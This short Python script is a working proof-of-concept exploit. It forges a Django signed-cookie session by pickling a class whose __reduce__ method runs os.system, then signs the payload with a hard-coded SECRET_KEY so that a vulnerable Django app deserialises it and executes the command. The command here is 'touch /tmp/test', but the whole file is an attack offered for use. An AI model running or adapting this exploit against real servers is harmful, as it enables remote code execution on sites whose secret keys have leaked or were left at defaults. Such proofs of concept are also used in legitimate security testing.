import pickle
import base64
import os
import time

from django.core.signing import b62_encode, base64_hmac


class RCE:
    def __reduce__(self):
        cmd = 'touch /tmp/test'
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    payload = base64.b64encode(pickled).decode()

    t = b62_encode(int(time.time()))

    salt = 'django.contrib.sessions.backends.signed_cookies'

    key = 'django-insecure-ev=u$$p4v3cqm@lzot5x#c772+brq8cezov@bm5lo18dhty6nr'

    sig = base64_hmac( salt + "signer", f'{payload}:{t}', key, algorithm='sha256')

    print(f'{payload}:{t}:{sig}')
